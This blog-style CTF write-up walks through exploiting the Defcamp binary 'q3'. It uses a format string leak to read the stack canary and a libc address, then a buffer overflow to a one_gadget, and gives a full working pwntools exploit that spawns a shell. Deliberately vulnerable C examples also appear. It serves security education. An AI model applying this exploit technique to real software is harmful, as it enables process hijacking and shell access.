---
title:      "Binary Exploitation - Format String + Buffer Overflow Vulnerability"
date: 2018-09-12 22:25:00
author:     "d4mianwayne"
category: Binary Exploitation
tag: pwn, fmtstr, bof
---


A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to get a shell.


# Foreword

I want to write this post because while I was trying to learn more about binary exploitation, I came across this interesting challenge as this shows how a two way vulnerability would be used to bypass stack canary protection and executable stack and let you use the buffer overflow vulnerability.

>Warning: This post will be long and detailed enough, so hang in there.

# What is Format String Vulnerability?

At first, let's start as we normally would. Format string as in C used to specify the the way data is going to be printed to the screen or console. Consider the following program:-


```C
#include<stdio.h>

int main(int argc, char *argv[])
{
     printf(argv[1]); /* No format specifier - here's the vulnerability */
     printf("\n");
     return 0;
}
```

Let's compile this:-

```bash
robin@oracle:/tmp$ gcc -o new new.c
new.c: In function ‘main’:
new.c:3:6: warning: implicit declaration of function ‘printf’ [-Wimplicit-function-declaration]
      printf(argv[1]); /* No format specifier */
      ^~~~~~
new.c:3:6: warning: incompatible implicit declaration of built-in function ‘printf’
new.c:3:6: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
new.c:3:6: warning: format not a string literal and no format arguments [-Wformat-security]  <--- Warning for no format specification 

```

Ah, so we got a warning(intended one), let's run:-

```bash
robin@oracle:/tmp$ ./new Hello
Hello  <-- Works fine!  
robin@oracle:/tmp$ ./new %x
d24f0e8 <-- Wait, what?
```

As you can see it works fine if we give it a string or something else but as soon as we give it a hex format specifier it gives hex data. In case you're wondering, that hex data is an actual address from the program stack. Thus, if there's no format specifier in a program and the data is being printed or shown accordingly, we can use a format specifier as an input parameter to leak stack addresses for own use.


# What is Buffer Overflow?

I'm sure that most of you know what it is but still let's have a recap. Buffer overflow vulnerability occurs when a user gives more input than it was supposed to handle hence making the memory region to overflow by the input. If used smartly, it can be used for many gains.

Consider the following program:-

```C
#include<stdio.h>
#include<stdlib.h>

void winner()
{
 system("/bin/bash");
} 

int main()
{
 char buf[10];
 scanf("%s",buf);
 printf("Hello %s",buf);
 return 0;
}
```
PS: It was the only simple thing I could think of.

So, as you can see it takes 10 characters as input and display them. Let's compile it and turn off the protections to make it work:

```bash
robin@oracle:/tmp$ sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space' # Turn off the ASLR(Address Space Layout Randomization)
robin@oracle:/tmp$ gcc -o bof -fno-stack-protector -z execstack bof.c  # Makes Stack Executable and turn off stack smashing
```
It's compiled now, time to run it:-

```bash
robin@oracle:/tmp$ ./bof
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
A Segementation Fault, we have a buffer overflow vulnerability here.

>Note: The Buffer Overflow program, consider it as a challenge and complete it. Go Pwn! 

# Protections on Binaries

As you saw earlier, I used some gcc flags to turn off the standard protections. This process is commonly referred to as hardening as these protections prevents the vulnerability to be exploited and hence makes it harder for us to exploit it. These protections includes:-

* Buffer overflow protection
* Stack overwriting protection
* Position independent executables (see Address space layout randomization)
* Binary stirring (randomizing the address of basic blocks)
* Pointer masking (protection against code injection)
* Control flow randomization (to protect against control flow diversion)

Following are the protections, we will deal with:- 

#### Stack Canaries

This method works by placing a small integer, the value of which is randomly chosen at program start, in memory just before the stack return pointer. Most buffer overflows overwrite memory from lower to higher memory addresses, so in order to overwrite the return pointer (and thus take control of the process) the canary value must also be **overwritten**. This value is checked to make sure it has not changed before a routine uses the return pointer on the stack.

#### Non-Executable Stack

Another approach to preventing stack buffer overflow exploitation is to enforce a memory policy on the stack memory region that disallows execution from the stack. This means that in order to execute shellcode from the stack an attacker must either find a way to disable the execution protection from memory, or find a way to put her/his shellcode payload in a non-protected region of memory.
Even if this were not so, there are other ways. The most damning is the so-called return to libc method for shellcode creation. In this attack the malicious payload will load the stack not with shellcode, but with a proper call stack so that execution is vectored to a chain of standard library calls, usually with the effect of disabling memory execute protections and allowing shellcode to run as normal. This works because the execution never actually vectors to the stack itself.
A variant of return-to-libc is return-oriented programming (ROP), which sets up a series of return addresses, each of which executes a small sequence of cherry-picked machine instructions within the existing program code or system libraries, sequence which ends with a return. These so-called gadgets each accomplish some simple register manipulation or similar execution before returning, and stringing them together achieves the attacker's ends. It is even possible to use "returnless" return-oriented programming by exploiting instructions or groups of instructions that behave much like a return instruction.

>This is an ongoing series on my blog.

# __main__ 

Now, let's get started:-

##### Attached files:

[q3](/files/binary/q3)


### Analysing the binary

Let's analyse or reverse enginner the binary first, I'll be using radare2 for disassembly and IDA Pro for decompiled functions:-

```r
robin@oracle:~$ r2 -AAAA q3

--snip--

[0x00000670]> afl
0x00000000    3 72   -> 73   sym.imp.__libc_start_main
0x000005f8    3 23           sym._init
0x00000620    1 6            sym.imp.puts
0x00000630    1 6            sym.imp.__stack_chk_fail
0x00000640    1 6            sym.imp.printf
0x00000650    1 6            sym.imp.fgets
0x00000660    1 6            sub.__cxa_finalize_248_660
0x00000670    1 43           entry0
0x000006a0    4 50   -> 40   sym.deregister_tm_clones
0x000006e0    4 66   -> 57   sym.register_tm_clones
0x00000730    4 49           sym.__do_global_dtors_aux
0x00000770    1 10           entry1.init
0x0000077a    3 182          sym.main
0x00000830    4 101          sym.__libc_csu_init
0x000008a0    1 2            sym.__libc_csu_fini
0x000008a4    1 9            sym._fini
```

No special function is seen here, let's disassemble `main`:-

```r
[0x00000670]> pdf @main
            ;-- main:
/ (fcn) sym.main 182
|   sym.main ();
|           ; var FILE local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; var int local_18h @ rbp-0x18
|           ; var int local_8h @ rbp-0x8
|              ; DATA XREF from 0x0000068d (entry0)
|           0x0000077a      55             push rbp
|           0x0000077b      4889e5         mov rbp, rsp
|           0x0000077e      4883ec30       sub rsp, 0x30               ; '0'
|           0x00000782      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x19e0 ; '('
|           0x0000078b      488945f8       mov qword [local_8h], rax
|           0x0000078f      31c0           xor eax, eax
|           0x00000791      48c745e00000.  mov qword [local_20h], 0
|           0x00000799      48c745e80000.  mov qword [local_18h], 0
|           0x000007a1      488b05680820.  mov rax, qword [obj.stdin]  ; loc.stdin ; [0x201010:8]=0
|           0x000007a8      488945d8       mov qword [local_28h], rax
|           0x000007ac      488d3d010100.  lea rdi, qword str.Enter_name_: ; 0x8b4 ; "Enter name : " ; const char * format
|           0x000007b3      b800000000     mov eax, 0
|           0x000007b8      e883feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x000007bd      488b55d8       mov rdx, qword [local_28h]  ; FILE *stream
|           0x000007c1      488d45e0       lea rax, qword [local_20h]
|           0x000007c5      be10000000     mov esi, 0x10               ; int size
|           0x000007ca      4889c7         mov rdi, rax                ; char *s
|           0x000007cd      e87efeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x000007d2      488d3de90000.  lea rdi, qword str.Hello    ; 0x8c2 ; "Hello" ; const char * s
|           0x000007d9      e842feffff     call sym.imp.puts           ; int puts(const char *s)
|           0x000007de      488d45e0       lea rax, qword [local_20h]
|           0x000007e2      4889c7         mov rdi, rax                ; const char * format
|           0x000007e5      b800000000     mov eax, 0
|           0x000007ea      e851feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x000007ef      488d3dd20000.  lea rdi, qword str.Enter_sentence_: ; 0x8c8 ; "Enter sentence : " ; const char * format
|           0x000007f6      b800000000     mov eax, 0
|           0x000007fb      e840feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00000800      488b55d8       mov rdx, qword [local_28h]  ; FILE *stream
|           0x00000804      488d45e0       lea rax, qword [local_20h]
|           0x00000808      be00010000     mov esi, 0x100              ; int size
|           0x0000080d      4889c7         mov rdi, rax                ; char *s
|           0x00000810      e83bfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x00000815      b800000000     mov eax, 0
|           0x0000081a      488b4df8       mov rcx, qword [local_8h]
|           0x0000081e      6448330c2528.  xor rcx, qword fs:[0x28]
|       ,=< 0x00000827      7405           je 0x82e
|       |   0x00000829      e802feffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |      ; JMP XREF from 0x00000827 (sym.main)
|       `-> 0x0000082e      c9             leave
\           0x0000082f      c3             ret
```

First input is getting printed and as you can see at line ` 0x000007d2      488d3de90000.  lea rdi, qword str.Hello    ; 0x8c2 ; "Hello" ; const char * s` there's no specifier at the commented string otherwise radare2 would've been able to show it. And since it's getting printed with ` 0x000007ea      e851feffff     call sym.imp.printf         ; int printf(const char *format)` instruction we know where the format string vulerability is.

For ease of understanding, we have a decompiled function with the help of IDA:-
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // ST08_8
  char s[8]; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  *(_QWORD *)s = 0LL;
  v6 = 0LL;
  stream = (FILE *)_bss_start;
  printf("Enter name : ", argv, envp);
  fgets(s, 16, stream);
  puts("Hello");
  printf(s, 16LL);  <-- Here's the vulnerability, just like in that example, isn't it?
  printf("Enter sentence : ");
  fgets(s, 256, stream);
  return 0;
}
```

### Exploiting the binary

So, let's make a script to find the offset for the input on stack, who knows we might be able to get something of interest?

```python
from pwn import *

for i in range(2,20):
	p = process("./q3")
	p.sendline("AAAA %{}$lx".format(i)) # will print the stack data in hex format
	p.recvline() # Hello
	print i,p.recvline()
	p.close()
```
Let's run it:-

```r
robin@oracle:~/CTFs/Defcamp$ python find_off.py 
[+] Starting local process './q3': pid 8323
2 AAAA 7ffff7dd18c0

[*] Stopped process './q3' (pid 8323)
[+] Starting local process './q3': pid 8325
3 AAAA 7ffff7af4154

[*] Stopped process './q3' (pid 8325)
[+] Starting local process './q3': pid 8327
4 AAAA 7ffff7fd24c0

[*] Stopped process './q3' (pid 8327)
[+] Starting local process './q3': pid 8329
5 AAAA 0

[*] Stopped process './q3' (pid 8329)
[+] Starting local process './q3': pid 8331
6 AAAA 7ffff7de59a0

[*] Stopped process './q3' (pid 8331)
[+] Starting local process './q3': pid 8333
7 AAAA 7ffff7dcfa00

[*] Stopped process './q3' (pid 8333)
[+] Starting local process './q3': pid 8335
8 AAAA 2438252041414141                                        <--- Offset 

[*] Stopped process './q3' (pid 8335)
[+] Starting local process './q3': pid 8337
9 AAAA a786c

[*] Stopped process './q3' (pid 8337)
[+] Starting local process './q3': pid 8339
10 AAAA 7fffffffde80

[*] Stopped process './q3' (pid 8339)
[+] Starting local process './q3': pid 8341
11 AAAA a17e6a7c1c53c000                                       <--- This is of interest

[*] Stopped process './q3' (pid 8341)
[+] Starting local process './q3': pid 8343
12 AAAA 555555554830

[*] Stopped process './q3' (pid 8343)
[+] Starting local process './q3': pid 8345
13 AAAA 7ffff7a05b97

[*] Stopped process './q3' (pid 8345)
[+] Starting local process './q3': pid 8347
14 AAAA 1

[*] Stopped process './q3' (pid 8347)
[+] Starting local process './q3': pid 8349
15 AAAA 7fffffffde88

[*] Stopped process './q3' (pid 8349)
[+] Starting local process './q3': pid 8351
16 AAAA 100008000

[*] Stopped process './q3' (pid 8351)
[+] Starting local process './q3': pid 8353
17 AAAA 55555555477a

[*] Stopped process './q3' (pid 8353)
[+] Starting local process './q3': pid 8355
18 AAAA 0

[*] Stopped process './q3' (pid 8355)
[+] Starting local process './q3': pid 8357
19 AAAA 8f241916698aca1f                                     <--- This is of interest

[*] Stopped process './q3' (pid 8357)
```

So, the addresses starting from `0x7f` are libc addresses and we have offset for our input at 8 but what are those at offset 11 and 19? Whatever it is, this is something we might need. Upon discussing this from a guy(super helpful) named Faith, he told me that it **could be** stack canary address. Now, if we didn't had a format string vulnerability then we had to bruteforce the value,luckily enough we have that vulnerability here.

To be more broad:-
I'll be using gdb-gef as we have to inspect some of the registers, et's break the `__main__` function:-

```r
gef➤  disas main
Dump of assembler code for function main:
   0x000000000000077a <+0>:	push   rbp
   0x000000000000077b <+1>:	mov    rbp,rsp
   0x000000000000077e <+4>:	sub    rsp,0x30
   0x0000000000000782 <+8>:	mov    rax,QWORD PTR fs:0x28
   0x000000000000078b <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000000078f <+21>:	xor    eax,eax
   0x0000000000000791 <+23>:	mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000000799 <+31>:	mov    QWORD PTR [rbp-0x18],0x0
   0x00000000000007a1 <+39>:	mov    rax,QWORD PTR [rip+0x200868]        # 0x201010 <stdin@@GLIBC_2.2.5>
   0x00000000000007a8 <+46>:	mov    QWORD PTR [rbp-0x28],rax
   0x00000000000007ac <+50>:	lea    rdi,[rip+0x101]        # 0x8b4
   0x00000000000007b3 <+57>:	mov    eax,0x0
   0x00000000000007b8 <+62>:	call   0x640 <printf@plt>
   0x00000000000007bd <+67>:	mov    rdx,QWORD PTR [rbp-0x28]
   0x00000000000007c1 <+71>:	lea    rax,[rbp-0x20]
   0x00000000000007c5 <+75>:	mov    esi,0x10
   0x00000000000007ca <+80>:	mov    rdi,rax
   0x00000000000007cd <+83>:	call   0x650 <fgets@plt>
   0x00000000000007d2 <+88>:	lea    rdi,[rip+0xe9]        # 0x8c2
   0x00000000000007d9 <+95>:	call   0x620 <puts@plt>
   0x00000000000007de <+100>:	lea    rax,[rbp-0x20]
   0x00000000000007e2 <+104>:	mov    rdi,rax
   0x00000000000007e5 <+107>:	mov    eax,0x0
   0x00000000000007ea <+112>:	call   0x640 <printf@plt>
   0x00000000000007ef <+117>:	lea    rdi,[rip+0xd2]        # 0x8c8
   0x00000000000007f6 <+124>:	mov    eax,0x0
   0x00000000000007fb <+129>:	call   0x640 <printf@plt>
   0x0000000000000800 <+134>:	mov    rdx,QWORD PTR [rbp-0x28]
   0x0000000000000804 <+138>:	lea    rax,[rbp-0x20]
   0x0000000000000808 <+142>:	mov    esi,0x100
   0x000000000000080d <+147>:	mov    rdi,rax
   0x0000000000000810 <+150>:	call   0x650 <fgets@plt>
   0x0000000000000815 <+155>:	mov    eax,0x0
   0x000000000000081a <+160>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000000081e <+164>:	xor    rcx,QWORD PTR fs:0x28   <- This line checks whether the provided canary is equal to the one calculated before
   0x0000000000000827 <+173>:	je     0x82e <main+180>
   0x0000000000000829 <+175>:	call   0x630 <__stack_chk_fail@plt>
   0x000000000000082e <+180>:	leave  
   0x000000000000082f <+181>:	ret    
End of assembler dump.
```

Let's try to check those two offsets 11 and 19 to see if it's the stack canary or not:-

At first, we need to setup a breakpoint at the instruction where the comaprison happens i.e. `main+164` and we will just give random input at second and analyse the registers.

```r
gef➤  b *main+164
Breakpoint 1 at 0x81e
gef➤  r
Starting program: /home/robin/CTFs/Defcamp/q3 
Enter name : %11$lx %19$lx 
Hello
50a01b0663fa1e00 ebd42dea12670b41
Enter sentence : AAAA
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x50a01b0663fa1e00
$rdx   : 0x00007ffff7dd18d0  →  0x0000000000000000
$rsp   : 0x00007fffffffdd10  →  0x00007ffff7de59a0  →  <_dl_fini+0> push rbp
$rbp   : 0x00007fffffffdd40  →  0x0000555555554830  →  <__libc_csu_init+0> push r15
$rsi   : 0x00007fffffffdd20  →  0x2520000a41414141 ("AAAA"?)
$rdi   : 0x00007fffffffdd21  →  0x312520000a414141 ("AAA"?)
$rip   : 0x000055555555481e  →  0x000028250c334864 ("dH3
                                                        %("?)
$r8    : 0x0000555555756675  →  "x %19$lx"
$r9    : 0x00007ffff7fd24c0  →  0x00007ffff7fd24c0  →  [loop detected]
$r10   : 0x00007ffff7fd24c0  →  0x00007ffff7fd24c0  →  [loop detected]
$r11   : 0x246             
$r12   : 0x0000555555554670  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffde20  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd10│+0x0000: 0x00007ffff7de59a0  →  <_dl_fini+0> push rbp	 ← $rsp
0x00007fffffffdd18│+0x0008: 0x00007ffff7dcfa00  →  0x00000000fbad2288
0x00007fffffffdd20│+0x0010: 0x2520000a41414141 ("AAAA"?)	 ← $rsi
0x00007fffffffdd28│+0x0018: 0x00000a786c243931 ("19$lx"?)
0x00007fffffffdd30│+0x0020: 0x00007fffffffde20  →  0x0000000000000001
0x00007fffffffdd38│+0x0028: 0x50a01b0663fa1e00
0x00007fffffffdd40│+0x0030: 0x0000555555554830  →  <__libc_csu_init+0> push r15	 ← $rbp
0x00007fffffffdd48│+0x0038: 0x00007ffff7a05b97  →  <__libc_start_main+231> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555554810 <main+150>       call   0x555555554650 <fgets@plt>
   0x555555554815 <main+155>       mov    eax, 0x0
   0x55555555481a <main+160>       mov    rcx, QWORD PTR [rbp-0x8]
 → 0x55555555481e <main+164>       xor    rcx, QWORD PTR fs:0x28
   0x555555554827 <main+173>       je     0x55555555482e <main+180>
   0x555555554829 <main+175>       call   0x555555554630 <__stack_chk_fail@plt>
   0x55555555482e <main+180>       leave  
   0x55555555482f <main+181>       ret    
   0x555555554830 <__libc_csu_init+0> push   r15
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "q3", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555481e → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x000055555555481e in main ()
gef➤  p $rcx
$1 = 0x50a01b0663fa1e00    <-- Ye, there it is.
gef➤  
```

Here, we have a stack canary leak which is equal to the one in `rcx` register where it's getting stored. So, now we need to find out the libc offset as we are now on buffer overflow stage. As we already know we need to get libc offset and from earlier that format string vulnerability was causing the libc address to leak, so it'd be a matter of time to find it out:-

```r
gef➤  r
Starting program: /home/robin/CTFs/Defcamp/q3 
Enter name : %3$lx
Hello
7ffff7af4154
Enter sentence : ^C  
Program received signal SIGINT, Interrupt.

-- snip --

gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-x /home/robin/CTFs/Defcamp/q3
0x0000555555754000 0x0000555555755000 0x0000000000000000 r-- /home/robin/CTFs/Defcamp/q3
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /home/robin/CTFs/Defcamp/q3
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rw- 
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd1000 0x00007ffff7fd3000 0x0000000000000000 rw- 
0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p 0x7ffff7af4154 - 0x00007ffff79e4000
$1 = 0x110154
```

Using `vmmap` we get to know the address of executable and writable libc and using the address we leaked from `%3$lx` input we have the leaked libc address, we just subtracted the leak address from the `libc.so.6` address, we get the offset.



Time to find out the offsets for register so we we will create our final exploit:-

```r
gef➤  b *main+164
Breakpoint 1 at 0x81e
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /home/robin/CTFs/Defcamp/q3 
Enter name : AAAA
Hello
AAAA
Enter sentence : aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x6161616161616164 ("daaaaaaa"?)
$rdx   : 0x00007ffff7dd18d0  →  0x0000000000000000
$rsp   : 0x00007fffffffdd10  →  0x00007ffff7de59a0  →  <_dl_fini+0> push rbp
$rbp   : 0x00007fffffffdd40  →  "eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"
$rsi   : 0x00007fffffffdd20  →  "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"
$rdi   : 0x00007fffffffdd21  →  "aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"
$rip   : 0x000055555555481e  →  0x000028250c334864 ("dH3
                                                        %("?)
$r8    : 0x00005555557566d5  →  0x0000000000000000
$r9    : 0x00007ffff7fd24c0  →  0x00007ffff7fd24c0  →  [loop detected]
$r10   : 0x00007ffff7fd24c0  →  0x00007ffff7fd24c0  →  [loop detected]
$r11   : 0x246             
$r12   : 0x0000555555554670  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffde20  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd10│+0x0000: 0x00007ffff7de59a0  →  <_dl_fini+0> push rbp	 ← $rsp
0x00007fffffffdd18│+0x0008: 0x00007ffff7dcfa00  →  0x00000000fbad2288
0x00007fffffffdd20│+0x0010: "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"	 ← $rsi
0x00007fffffffdd28│+0x0018: "baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaaha[...]"
0x00007fffffffdd30│+0x0020: "caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaia[...]"
0x00007fffffffdd38│+0x0028: "daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"
0x00007fffffffdd40│+0x0030: "eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"	 ← $rbp
0x00007fffffffdd48│+0x0038: "faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555554810 <main+150>       call   0x555555554650 <fgets@plt>
   0x555555554815 <main+155>       mov    eax, 0x0
   0x55555555481a <main+160>       mov    rcx, QWORD PTR [rbp-0x8]
 → 0x55555555481e <main+164>       xor    rcx, QWORD PTR fs:0x28
   0x555555554827 <main+173>       je     0x55555555482e <main+180>
   0x555555554829 <main+175>       call   0x555555554630 <__stack_chk_fail@plt>
   0x55555555482e <main+180>       leave  
   0x55555555482f <main+181>       ret    
   0x555555554830 <__libc_csu_init+0> push   r15
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "q3", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555481e → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x000055555555481e in main ()
gef➤  pattern search daaaaaaa
[+] Searching 'daaaaaaa'
[+] Found at offset 17 (little-endian search) likely
[+] Found at offset 24 (big-endian search) 
gef➤  pattern search eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka
[+] Searching 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka'
[+] Found at offset 32 (big-endian search) 
gef➤  p $rcx
$1 = 0x6161616161616164   <--- Canary value overwrtten
```

As you can see we have overwritten the canary and we have the `rcx` register offset and we have `rbp` register offset at 32 which would be `32 - 24 = 8`. 


###  One_gadget - The best tool for finding one gadget RCE in libc.so.6 

I can honsetly vouch for this tool, this was the first time I used it and it's just awesome. With this tool it was easier to find the gadgets for shell spwaning.

```r
robin@oracle:~/CTFs/Defcamp$ ldd q3
	linux-vdso.so.1 (0x00007ffff7ffa000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff77e2000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd5000)
robin@oracle:~/CTFs/Defcamp$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

I'll be using the first one `0x4f2c5`. Now, it's time to pwn:-


### Final Exploit

We have almost everything, now it's time for final exploit:-

Here's the idea, I'll be using the format string specifier to leak canary and libc address and then use the stack canary value to send the payload and using the libc address offset we will get the one_gadget address and we are done.

```python
#!/usr/bin/env python2

from pwn import *

# stack canary is at offset 11 for format string
# It is at offset 24 for buffer overflow

BINARY = './q3'

elf = ELF(BINARY)
context.arch = 'amd64'
libc = elf.libc
p = process("./q3")

# Leak stack canary (offset 11) and the libc address (offset 3)
p.sendline('%11$lx-%3$lx')
p.recvline()
leaks = p.recvline()
stack_canary = int(leaks.split('-')[0], 16) # Stack Canary
libc.address = int(leaks.split('-')[1][:-1], 16) - 0x110154  # LIBC offset we found earlier 

log.info('canary: ' + hex(stack_canary))
log.info('libc base: ' + hex(libc.address))

one_gadget = libc.address + 0x4f2c5 # using one_gadget 
log.info('one_gadget: ' + hex(one_gadget))

payload = 'A'*24 # Write up to the stack canary
payload += p64(stack_canary) # Ensure we don't change the stack canary
payload += 'B'*8 # Overwrite RBP to reach upto RIP
payload += p64(one_gadget) # Overwrite RIP with pre-made shell

p.sendline(payload)

p.interactive()
```

Running the exploit we will get shell:-

```r
robin@oracle:~/CTFs/Defcamp$ python q3_exp.py 
[*] '/home/robin/CTFs/Defcamp/q3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './q3': pid 9550
[*] canary: 0x648678ab45c48e00
[*] libc base: 0x7ffff79e4000
[*] one_gadget: 0x7ffff7a332c5
[*] Switching to interactive mode
$ ls
core                 libc.so.6       q3_exp.py  q3.til
$ 
[*] Interrupted
[*] Stopped process './q3' (pid 9550)
```


That was it folks, took more than I thought it would but we made it.

I hope you enjoyed it and learned something today. If you encountered any problem or anything relevant contact me on [twitter](https://twitter.com/d4mianwayne)